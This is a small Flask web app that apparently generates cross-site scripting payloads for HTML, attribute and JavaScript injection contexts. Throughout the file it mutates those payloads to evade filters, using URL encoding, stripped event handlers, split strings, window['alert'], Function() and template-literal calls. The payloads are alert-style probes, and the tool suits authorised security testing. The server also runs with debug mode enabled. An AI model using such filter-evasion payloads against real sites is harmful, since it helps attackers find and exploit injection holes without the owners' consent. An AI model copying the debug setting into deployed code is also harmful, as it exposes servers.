from flask import Flask, render_template, request, jsonify
import os

app = Flask(__name__)

# ---------------- MUTATION ENGINE ----------------
def mutate(payload):
    mutations = []

    # basic encoding
    mutations.append(payload.replace("<", "%3C").replace(">", "%3E"))
    mutations.append(payload.upper())
    mutations.append(payload.replace(" ", "%0A"))

    if "alert" in payload:
        mutations.append(payload.replace("alert", 'al"+"ert'))
        mutations.append(payload.replace("alert", 'this["alert"]'))
        mutations.append(payload.replace("alert", "window['alert']"))
        mutations.append(payload.replace("alert", "top['alert']"))
        mutations.append(payload.replace("alert", "self['alert']"))
        mutations.append(payload.replace("alert(1)", "Function('alert(1)')()"))
        mutations.append(payload.replace("alert(1)", "alert`1`"))

    return mutations

# ---------------- PAYLOAD GENERATOR ----------------
def generate_payloads(context, filters, custom_payloads):

    payloads = []

    if context == "html":
        payloads += ['<svg onload=alert(1)>','<img src=x onerror=alert(1)>']

    elif context == "attribute":
        payloads += ['" onmouseover=alert(1) x="', "' onmouseover=alert(1) x='", 'javascript:alert(1)']

    elif context == "js":
        payloads += ['";alert(1);//', "';alert(1);//"]

    else:
        payloads += ['<svg onload=alert(1)>','";alert(1);//']

    adapted = []

    for p in payloads:
        if "alert" in filters:
            p = p.replace("alert", "confirm")
        if "space" in filters:
            p = p.replace(" ", "/")
        if "angle" in filters:
            p = p.replace("<", "%3C").replace(">", "%3E")
        if "quote" in filters:
            p = p.replace('"', '&quot;').replace("'", '&#39;')
        if "event" in filters:
            for e in ["onload","onerror","onmouseover","onclick"]:
                p = p.replace(e, "")
        if "jsproto" in filters:
            p = p.replace("javascript:", "")
        adapted.append(p)

    final_payloads = []

    for p in adapted:
        final_payloads.append(p)
        final_payloads.extend(mutate(p))

    for cp in custom_payloads:
        if cp.strip():
            final_payloads.append(cp.strip())
            final_payloads.extend(mutate(cp.strip()))

    return list(set(final_payloads))

# ---------------- ROUTES ----------------
@app.route("/")
def home():
    return render_template("index.html")

@app.route("/generate", methods=["POST"])
def generate():
    data = request.json

    context = data.get("context")
    filters = data.get("filters", [])
    custom_payloads = data.get("custom_payloads", [])

    payloads = generate_payloads(context, filters, custom_payloads)

    return jsonify(payloads)

if __name__ == "__main__":
    app.run(debug=True)